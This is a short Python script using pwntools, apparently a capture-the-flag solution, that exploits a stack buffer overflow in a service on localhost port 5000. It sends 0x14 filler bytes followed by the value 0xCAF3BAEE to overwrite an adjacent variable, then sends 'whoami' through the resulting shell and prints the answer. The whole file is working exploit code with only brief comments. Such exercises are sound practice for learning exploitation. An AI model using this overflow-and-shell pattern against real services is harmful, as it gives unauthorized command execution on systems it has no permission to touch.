# https://docs.pwntools.com/en/stable/globals.html
from pwn import *

context(arch="i386", os="linux")

target = remote("localhost", 5000)

# Make the payload
# 0x14 bytes of filler data to fill the gap between the start of our input
# and the target int
# 0x4 byte int we will overwrite target with
payload = b"A" * 0x14 + p32(0xCAF3BAEE)

print(target.recvuntil(b"boiiiii??"))

# Send the payload
target.sendline(payload)

# Drop to an interactive shell so we can interact with our shell
# target.interactive()
# do not work because of `W ioctl(5, IOCTL_VM_SOCKETS_GET_LOCAL_CID, ...): Inappropriate ioctl for device` error
# print(target.recvline())

target.sendline(b"whoami")

# print(target.recv(1024))
print(target.recvline())
